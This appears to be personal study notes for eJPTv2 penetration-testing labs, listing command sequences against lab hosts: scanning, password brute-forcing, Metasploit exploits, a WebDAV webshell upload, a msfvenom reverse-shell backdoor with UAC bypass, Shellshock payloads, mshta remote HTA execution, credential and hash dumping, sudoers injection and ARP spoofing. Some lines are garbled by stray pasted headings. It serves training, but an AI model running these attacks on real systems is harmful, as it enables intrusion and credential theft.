##  ejptv2 labs
**Assessment Methodologies: Information Gathering**

01)  Windows Recon: Nmap Host Discovery
```
cat Desktop/target # 10.0.22.124
ping -c 5 10.0.22.124 # no response
nmap  10.0.22.124
nmap -Pn 10.0.22.124
nmap -Pn -p 443 10.0.22.124
nmap -Pn -sV -p 80 10.0.22.124
```
**Assessment Methodologies: Footprinting & Scanning**

02)  Scan the Server 1
```
ip aSSH Login
ping -c 4  192.35.94.3
nmap 192.35.94.3
nmap -p-  192.35.94.3
nmap -sV -p 6421,41288,55413  192.35.94.3
```
03)  Windows Recon: SMB Nmap Scripts
   
```
cat /Desktop/target
ping -c 5 10.0.17.200
nmap 10.0.17.200
nmap -p445 --script smb-protocols 10.0.17.200
nmap -p445 --script smb-security-mode 10.0.17.200
nmap -p445 --script smb-enum-sessions 10.0.17.200
nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-enum-shares 10.0.17.200
nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200

```
04)  Windows Recon: Zenmap (nmap gui)

```
nmap -T4 -A -v 10.0.17.0/20
```

05)  Scan the Server 2

```
ip a
ping 192.206.172.3
nmap  -p 177 -A 192.206.172.3
nmap  -p 1-250 -sU 192.206.172.3
nmap  -p 134,177,234 -sUV 192.206.172.3
nmap 192.206.172.3 -p 134 -sUV --script=discovery
tftp 192.206.172.3 134
status
```

06)  Scan the Server 3

```
ip a
ip addr
ip a s
ping 192.57.232.3
nmap -T4 -p- 192.57.232.3
nmap -T4 -sU  192.57.232.3
nmap -T4 -sU -p 161 -A 192.57.232.3

```
**Assessment Methodologies: Enumeration**

07)  Windows Recon: SMB Discover and Mount

```Web App Vulnerability Scanning With WMAP
ipconfig
nmap 10.0.24.0/20 --open
The target subnet is “255.255.240.0” hence we have mentioned CIDR to 20.
Go to This PC → Network → Right Click on Network → Map Network Drive
\\10.0.22.92
net use * /delete
net use Z: \\10.0.22.92\C$ smbserver_771 /user:administrator

```
08)  Windows Recon: SMBMap

```
ls -al /usr/share/nmap/scripts/ | grep -e "ftp"            # for nmap
cd  /usr/share/nmap/scripts/                               # for nmap
ls -l | grep -e  ssh                                       # for nmap
less ssh-hostkey.nse
ls -al |grep smb-o
nmap 10.0.28.123
nmap -p445 --script smb-protocols 10.0.28.123
smbmap -u guest -p "" -d . -H 10.0.28.123
smbmap -u administrator -p smbserver_771 -d . -H 10.0.28.123
smbmap -H 10.0.28.123 -u administrator -p smbserver_771 -x 'ipconfig'
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -L
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$'
touch backdoor
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor'
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$'
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --download 'C$\flag.txt'
cat /root/10.0.28.123-C_flag.txt
```
09)  Samba Recon: Basics

```
nmap 192.126.66.3
nmap -sU --top-ports 25 192.126.66.3
nmap -sV -p 445 192.126.66.3
nmap --script smb-os-discovery.nse -p 445 192.126.66.3

msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.126.66.3
exploit

nmap --script smb-os-discovery.nse -p 445 192.126.66.3
nmblookup -A 192.126.66.3
smbclient -L 192.126.66.3 -N
rpcclient -U "" -N 192.126.66.3
```
10)  Samba Recon: Basics II

```
rpcclient -U "" -N 192.144.106.3
srvinfo
enum4linux -o 192.144.106.3
smbclient -L 192.144.106.3 -N
nmap -p445 --script smb-protocols 192.144.106.3

msfconsole
use auxiliary/scanner/smb/smb2
set RHOSTS 192.144.106.3
exploit

nmap --script smb-enum-users.nse -p445 192.144.106.3
msfconsole
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 192.144.106.3
exploit

enum4linux -U 192.144.106.3
rpcclient -U "" -N 192.144.106.3
enumdomusers
rpcclient -U "" -N 192.144.106.3
lookupnames admin

```

11)  Samba Recon: Basics III

```
nmap --script smb-enum-shares.nse -p445 192.144.106.3
msfconsole
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.144.106.3
exploit
enum4linux -S 192.144.106.3
smbclient -L 192.144.106.3 -N
enum4linux -G 192.144.106.3
rpcclient -U "" -N 192.144.106.3
enumdomgroups
enum4linux -i 192.144.106.3
smbclient //192.144.106.3/public -N
ls
smbclient //192.144.106.3/public -N
ls
cd secret
ls
get flag
exit
cat flag
```

12)  Samba Recon: Dictionary Attack

```
msfconsole
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txtGetting Started: Tshark
set SMBUser janeGetting Started: Tshark
set RHOSTS 192.212.251.3
exploit
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.212.251.3 smb
smbmap -H 192.212.251.3 -u admin -p password1
smbclient -L 192.212.251.3 -U jane
smbclient //192.212.251.3/jane -U jane
smbclient //192.212.251.3/admin -U admin
ls
cd hidden
ls
get flag.tar.gz
exit
tar -xf flag.tar.gz
cat flag
msfconsole
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass password1
set RHOSTS 192.212.251.3
exploit
enum4linux -r -u "admin" -p "password1" 192.212.251.3

```
13)  ProFTP Recon: Basics

```
nmap -sV 192.235.127.3
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.235.127.3 -t 4 ftp
echo "sysadmin" > users
nmap --script ftp-brute --script-args userdb=/root/users -p 21 192.235.127.3
ftp 192.235.127.3
ls
get secret.txt
exit
cat secret.txt
```
14)  VSFTPD Recon: Basics

```
ip a s
nmap 192.213.140.3
nmap -sV 192.213.140.3
nmap --script ftp-anon 192.213.140.3
ftp 192.213.140.3 # anonymous
ls
get flag
exit
cat flag 
```

15)  SSH Recon: Basic

```
nmap -sV 192.201.39.3
nc 192.201.39.3
ssh root@192.201.39.3
nmap --script ssh2-enum-algos 192.201.39.3
nmap --script ssh-hostkey --script-args ssh_hostkey=full 192.201.39.3
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=student" 192.201.39.3
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=admin" 192.201.39.3
nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student,ssh-run.password=" 192.201.39.3
```
16)  SSH Recon: Dictionary Attack

```
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l student -P /usr/share/wordlists/rockyou.txt 192.40.231.3 ssh
echo "administrator" > users
nmap -p 22 --script ssh-brute --script-args userdb=/root/users 192.40.231.3
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.40.231.3
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set verbose true
exploit
ssh root@192.40.231.3
```

17)  Windows Recon: IIS

```
cat /root/Desktop/target
nmap 10.0.29.163
whatweb 10.0.29.163
http 10.0.29.163
dirb http://10.0.29.163
browsh --startup-url http://10.0.29.163/Default.aspx
#the httpie tool to gather target server information
```

18)  Windows Recon: IIS: Nmap Scripts

```
cat /root/Desktop/target
nmap 10.0.28.146
nmap --script http-enum -sV -p 80 10.0.28.146
nmap --script http-headers -sV -p 80 10.0.28.146
nmap --script http-methods --script-args http-methods.url-path=/webdav/ 10.0.28.146
nmap --script http-webdav-scan --script-args http-methods.url-path=/webdav/ 10.0.28.146
```
19)  Apache Recon: Basics

```
nmap -sV -script banner 192.30.247.3
msfconsole
use auxiliary/scanner/http/http_version
set RHOSTS 192.30.247.3
exploit
curl http://192.30.247.3/
wget http://192.30.247.3/index
browsh --startup-url 192.30.247.3
lynx http://192.30.247.3
use auxiliary/scanner/http/brute_dirs
set RHOSTS 192.30.247.3
exploit
dirb http://192.30.247.3 /usr/share/metasploit-framework/data/wordlists/directory.txt
use auxiliary/scanner/http/robots_txt
set RHOSTS 192.30.247.3
run
```

20)  MySQL Recon: Basics

```
nmap -sV 192.71.145.3
mysql -h 192.71.145.3 -u root
show databases;
use books;
select count(*) from authors;
msfconsole
use auxiliary/scanner/mysql/mysql_schemadump
set RHOSTS 192.71.145.3
set USERNAME root
set PASSWORD ""
exploit
use auxiliary/scanner/mysql/mysql_writable_dirs
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set RHOSTS 192.71.145.3
set VERBOSE false
set PASSWORD ""
exploit
use auxiliary/scanner/mysql/mysql_file_enum
set RHOSTS 192.71.145.3
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set PASSWORD ""
exploit
mysql -h 192.71.145.3 -u root
select load_file("/etc/shadow");
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS 192.71.145.3
set USERNAME root
set PASSWORD ""
exploit
nmap --script=mysql-empty-password -p 3306 192.71.145.3
nmap --script=mysql-info -p 3306 192.71.145.3
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 192.71.145.3
nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 192.71.145.3
nmap --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''" -p 3306 192.71.145.3
```

21)  MySQL Recon: Dictionary Attack

```
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.149.194.3
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS true
exploit
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.149.194.3 mysql
```

22)  Recon: MSSQL: Nmap Scripts

```
cat Desktop/target 
nmap 10.0.20.186
ls -al /usr/share/nmap/scripts/ | grep -e ms-sql
nmap --script ms-sql-info -p 1433 10.0.20.186
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 10.0.20.186
nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 10.0.20.186
nmap -p 1433 --script ms-sql-empty-password 10.0.20.186
nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" 10.0.20.186 -oN output.txt
gvim output.txt
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria 10.0.20.186
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" 10.0.20.186
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" 10.0.20.186

```
23)  Recon: MSSQL: Metasploit

```
cat /root/Desktop/target
nmap 10.0.20.101
nmap --script ms-sql-info -p 1433 10.0.20.101
msfconsole -q
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 10.0.20.101
set USER_FILE /root/Desktop/wordlist/common_users.txt
set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
set VERBOSE false
exploit
use auxiliary/admin/mssql/mssql_enum
set RHOSTS 10.0.20.101
exploit
use auxiliary/admin/mssql/mssql_enum_sql_logins
set RHOSTS 10.0.20.101
exploit
use auxiliary/admin/mssql/mssql_exec
set RHOSTS 10.0.20.101
set CMD whoami
exploit
use auxiliary/admin/mssql/mssql_enum_domain_accounts
set RHOSTS 10.0.20.101
exploit
```
**Assessment Methodologies: Vulnerability Assessment**

24)  Nessus

```
https://localhost:8834/
DISCOVERY -> Port Scanning settings
ASSESSMENT -> ** Web Applications** settings

```
25) Windows: Easy File Sharing Server  

```
cat Desktop/target
nmap 10.0.29.29
nmap -sV -p 80 10.0.29.29
searchsploit Badblue 2.7
use exploit/windows/http/badblue_passthru
set RHOSTS 10.0.29.29
shell
run
dir
type flag.txt

```
**Assessment Methodologies: Auditing Fundamentals**
only  Nessus lab 

```

```
**Host & Network Penetration Testing: System/Host Based Attacks**

26)  Windows: IIS Server DAVTest

```
cat /root/Desktop/target
nmap 10.0.16.177
nmap --script http-enum -sV -p 80 10.0.16.177
davtest -url http://10.0.16.177/webdav
davtest -auth bob:password_123321 -url http://10.0.16.177/webdav
cadaver http://10.0.16.177/webdav
put /usr/share/webshells/asp/webshell.asp
ls
http://10.0.16.177/webdav/webshell.asp
http://10.0.16.177/webdav/webshell.asp?cmd=whoami
dir C:\
type C:\type flag.txt
```
27)  Windows: IIS Server: WebDav Metasploit

```
cat /root/Desktop/target
nmap 10.0.17.27
nmap --script http-enum -sV -p 80 10.0.17.27
davtest -url http://10.0.17.27/webdav
davtest -auth bob:password_123321 -url http://10.0.17.27/webdav
msfconsole -q
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS 10.0.17.27
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
exploit
shell
cd /
dir
type flag.txt
```
28)  Windows: SMB Server PSexec

```
cat /root/Desktop/target
nmap 10.0.0.242
nmap -p445 --script smb-protocols 10.0.0.242
msfconsole -q
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS 10.0.0.242
set VERBOSE false
exploit
use exploit/windows/smb/psexec
set RHOSTS 10.0.0.242
set SMBUser Administrator
set SMBPass qwertyuiop
exploit
shell
cd /
dir
type flag.txt

```
29)  Windows: Insecure RDP Service

```
cat /root/Desktop/target
nmap 10.0.0.31
msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 10.0.0.31
set RPORT 3333
exploit
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.0.0.31 -s 3333
xfreerdp /u:administrator /p:qwertyuiop /v:10.0.0.31:3333
```

30)  WinRM: Exploitation with Metasploit
 
```
nmap --top-ports 7000 10.0.0.173
msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 10.0.0.173
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
exploit
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS 10.0.0.173
exploit
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS 10.0.0.173
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit
use exploit/windows/winrm/winrm_script_exec
set RHOSTS 10.0.0.173
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit
cd /
dir
type flag.txt
```

31)  UAC Bypass: UACMe
```
cat /root/Desktop/target
nmap 10.0.27.103
nmap -sV -p 80 10.0.27.103
searchsploit hfs
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.0.27.103
explot
getuid
sysinfo
ps -S explorer.exe
migrate 2444
getsystem
shell
net localgroup administrators
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f exe > 'backdoor.exe
file ''backdoor.exe'
CTRL + C
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
ls
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.1.3
set LPORT 4444
exploit
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
ps -S lsass.exe
migrate 680
hashdump
```

32) Privilege Escalation: Impersonate
    
```
cat /root/Desktop/target
nmap 10.0.28.7
nmap -sV -p 80 10.0.28.7
searchsploit hfs
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.0.28.7
exploit 
getuid
C:\Users\Administrator\Desktop\flag.txt
load incognito
list_tokens -u
impersonate_token ATTACKDEFENSE\\Administrator 
getuid
cat C:\\Users\\Administrator\\Desktop\\flag.txt

```
33)  Unattended Installation

```
open powershell
whoami
Powershell.exe
cd .\Desktop\PowerSploit\Privesc\
ls
powershell -ep bypass (PowerShell execution policy bypass)
. .\PowerUp.ps1
Invoke-PrivescAudit
cat C:\Windows\Panther\Unattend.xml
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password
runas.exe /user:administrator cmd
Admin@123  # Enter the password
whoami
msfconsole -q
use exploit/windows/misc/hta_server
exploit
mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta (#Enter the url)
sessions -i 1
cd /
cd C:\\Users\\Administrator\\Desktop
dir
cat flag.txt
```
34) Windows: Meterpreter: Kiwi Extension

```
cat /root/Desktop/target
nmap 10.0.27.166
nmap -sV -p 80 10.0.27.166
searchsploit badblue 2.7
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS 10.0.27.166
exploit
migrate -N lsass.exe
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
```
35) Shellshock

```
ip addr
nmap 192.242.220.3
nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi” 192.242.220.3
open burp suite
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
() { :; }; echo; echo; /bin/bash -c 'id'
() { :; }; echo; echo; /bin/bash -c 'ps -ef'
```
36) ProFTP Recon: Basics

```
nmap -sV 192.91.250.3
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.91.250.3 ftp
echo "sysadmin" > users
nmap --script ftp-brute --script-args userdb=/root/users -p 21 192.235.127.3
ftp 192.235.127.3
Enter username “sysadmin” and password 654321
ls
get secret.txt
exit
cat secret.txt
```

37) SSH Login

```
nmap -sS -sV 192.245.211.3
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.245.211.3
exploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.245.211.3
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
sessions
sessions -i 1
find / -name "flag"
cat /flag
```
38)  Samba Recon: Dictionary Attack

```
msfconsole
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
set RHOSTS 192.212.251.3
exploit
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.212.251.3 smb
smbmap -H 192.212.251.3 -u admin -p password1
smbclient -L 192.212.251.3 -U jane
smbclient //192.212.251.3/jane -U jane
smbclient //192.212.251.3/admin -U admin
ls
cd hidden
ls
get flag.tar.gz
exit
tar -xf flag.tar.gz
cat flag
msfconsole
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass password1
set RHOSTS 192.212.251.3
exploit
enum4linux -r -u "admin" -p "password1" 192.212.251.3

```
39) Cron Jobs Gone Wild II

```
ls -l
find / -name message
ls -l /tmp/
grep -nri “/tmp/message” /usr
ls -l /usr/local/share/copy.sh
cat /usr/local/share/copy.sh
 printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
sudo -l
sudo -l
sudo su
cd /root
ls -l
cat flag

```
40) Exploiting Setuid Programs

```
ls -l
file welcome
./welcome
strings welcome
rm greetings
./welcome
cd /root
cat flag
```
41) Password Cracker: Linux

```
nmap -sS -sV 192.229.31.3
nmap --script vuln -p 21 192.229.31.3
/etc/init.d/postgresql start
msfconsole -q
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS 192.229.31.3
exploit -z
use post/linux/gather/hashdump
set SESSION 1
exploit
use auxiliary/analyze/crack_linux
set SHA512 true
run

```
**Host & Network Penetration Testing: Network-Based Attacks**

42) Getting Started: Tshark

```
tshark -v
tshark -D
tshark -i eth0
tshark -r HTTP_traffic.pcap
tshark -r HTTP_traffic.pcap | wc -l
tshark -r HTTP_traffic.pcap -c 100
tshark -r HTTP_traffic.pcap -z io,phs -q
```
43) Filtering Basics: HTTP

```
tshark -Y ‘http’ -r HTTP_traffic.pcap
tshark -r HTTP_traffic.pcap -Y "ip.src==192.168.252.128 && ip.dst==52.32.74.91"
tshark -r HTTP_traffic.pcap -Y "http.request.method==GET"
tshark -r HTTP_traffic.pcap -Y "http.request.method==GET" -Tfields -e frame.time -e ip.src -e http.request.full_uri
tshark -r HTTP_traffic.pcap -Y "http contains password”
tshark -r HTTP_traffic.pcap -Y "http.request.method==GET && http.host==www.nytimes.com" -Tfields -e ip.dst
tshark -r HTTP_traffic.pcap -Y "ip contains amazon.in && ip.src==192.168.252.128" -Tfields -e ip.src -e http.cookie
tshark -r HTTP_traffic.pcap -Y "ip.src==192.168.252.128 && http" -Tfields -e http.user_agent
```

44) ARP Poisoning

```
ip addr
nmap 10.100.13.0/24
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
open wireshark and filter telnet
```

45) WiFi Security: Traffic Analysis I

```
(wlan.fc.type_subtype == 0x0008) && (!(wlan.wfa.ie.wpa.version == 1)) && !(wlan.tag.number == 48)
wlan.wfa.ie.wpa.version == 1 is to filter put a vendor IE
wlan contains Home_Network
wlan contains LazyArtists
(wlan.ssid contains "Amazon") && (wlan.fc.type_subtype == 0x0008)
(wlan.ta == e8:de:27:16:87:18) || (wlan.ra == e8:de:27:16:87:18)
((wlan.bssid == e8:de:27:16:87:18) ) && (wlan.fc.type_subtype == 0x0020)
(((wlan.bssid == e8:de:27:16:87:18)) && (wlan.addr==5c:51:88:31:a0:3b)) && (wlan.fc.type_subtype == 0x0001)

```
46) Filtering Advanced: WiFi
    
```
tshark -r WiFi_traffic.pcap -Y "wlan"
tshark -r WiFi_traffic.pcap -Y "wlan.fc.type_subtype==0x000c"
tshark -r WiFi_traffic.pcap -Y "eapol"
tshark -r WiFi_traffic.pcap -Y "wlan.fc.type_subtype==8" -Tfields -e wlan.ssid -e  wlan.bssid
tshark -r WiFi_traffic.pcap -Y "wlan.ssid==LazyArtists" -Tfields -e wlan.bssid
tshark -r WiFi_traffic.pcap -Y "wlan.ssid==Home_Network" -Tfields -e wlan_radio.channel
tshark -r WiFi_traffic.pcap -Y "wlan.fc.type_subtype==0x000c" -Tfields -e wlan.ra
tshark -r WiFi_traffic.pcap -Y "wlan.ta==5c:51:88:31:a0:3b && http" -Tfields -e http.user_agent
```
**Host & Network Penetration Testing: The Metasploit Framework (MSF)**

47)  Windows Recon: Nmap Host Discovery

```
cat /root/Desktop/target
ping -c 5 10.0.30.43
nmap 10.0.30.43
nmap -Pn 10.0.30.43
nmap -Pn -p 443 10.0.30.43
nmap -Pn -sV -p 80 10.0.30.43
```
48) Importing Nmap Scan Results Into MSF
    
```
nmap -Pn -sV 10.0.24.167 -oX windows_server_2012
service postgresql start
msfconsole
db_status
db_import /root/windows_server_2012
hosts
services
```
49)  T1046 : Network Service Scanning   **PIVOTING**

```
ip addr
nmap 192.120.121.3
curl 192.120.121.3
msfconsole
use exploit/unix/webapp/xoda_file_upload
set RHOSTS 192.120.121.3
set TARGETURI /
exploit
shell
ip addr
run autoroute -s 192.125.162.2
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.125.162.3
set verbose true
set ports 1-1000
exploit
ls -l /root/tools/static-binaries
#!/bin/bash
for port in {1..1000}; do
timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
upload /root/tools/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.125.162.3
./nmap -p- 192.125.162.3
```

50) FTP Enumeration

```
ifconfig
msfconsole
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.51.147.3
run
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.51.147.3
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.51.147.3
run
ftp 192.51.147.3

```

51) Samba Recon: Basics

```
nmap 192.126.66.3
nmap -sU --top-ports 25 192.126.66.3
nmap -sV -p 445 192.126.66.3
nmap --script smb-os-discovery.nse -p 445 192.126.66.3
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.126.66.3
exploit
nmap --script smb-os-discovery.nse -p 445 192.126.66.3
nmblookup -A 192.126.66.3  # command-line utility used to query NetBIOS name servers
smbclient -L 192.126.66.3 -N
rpcclient -U "" -N 192.126.66.3

```
52)  Apache Enumeration

```
use auxiliary/scanner/http/http_version
set RHOSTS 192.111.169.3
run
use auxiliary/scanner/http/robots_txt
set RHOSTS 192.111.169.3
run
use auxiliary/scanner/http/http_header
set RHOSTS 192.111.169.3
run
use auxiliary/scanner/http/http_header
set RHOSTS 192.111.169.3
set TARGETURI /secure
run
use auxiliary/scanner/http/brute_dirs
set RHOSTS 192.111.169.3
run
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.111.169.3
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run
use auxiliary/scanner/http/dir_listing
set RHOSTS 192.111.169.3
set PATH /data
run
use auxiliary/scanner/http/files_dir
set RHOSTS 192.111.169.3
set VERBOSE false
run
use auxiliary/scanner/http/http_put
set RHOSTS 192.111.169.3
set PATH /data
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run
use auxiliary/scanner/http/http_put
set RHOSTS 192.111.169.3
set PATH /data
set FILENAME test.txt
set ACTION DELETE
run
use auxiliary/scanner/http/http_login
set RHOSTS 192.111.169.3
set AUTH_URI /secure/
set VERBOSE false
run
use auxiliary/scanner/http/apache_userdir_enum
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set RHOSTS 192.111.169.3
set VERBOSE false
run

```
53)  MySQL Enumeration
    
```
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 192.76.252.3
run
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.76.252.3
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
use auxiliary/admin/mysql/mysql_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS 192.76.252.3
run
use auxiliary/admin/mysql/mysql_sql
set USERNAME root
set PASSWORD twinkle
set RHOSTS 192.76.252.3
run
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS 192.76.252.3
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS 192.76.252.3
run
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD twinkle
set RHOSTS 192.76.252.3
run
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS 192.76.252.3
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```
54)  SSH Login
    
```
nmap -sS -sV 192.245.211.3
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.245.211.3
exploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.245.211.3
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
sessions
sessions -i 1
/bin/bash -i
pwd
cd /
find / -name "flag"
cat /flag

```
55)  Postfix Recon: Basics

```
nmap -sV -script banner 192.80.153.3
nc 192.80.153.3 25
VRFY admin@openmailbox.xyz
VRFY commander@openmailbox.xyz
telnet 192.26.29.3 25
HELO attacker.xyz
EHLO attacker.xyz
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t 192.80.153.3
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.80.153.3
Exploit
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s 192.26.29.3 -u Fakemail -m "Hi root, a fake from admin" -o tls=no

```
56) Web App Vulnerability Scanning With WMAP
    
```
ifconfig
msfconsole
load wmap
wmap_sites -a 192.157.89.3
wmap_targets -t http://192.157.89.3
wmap_sites -l
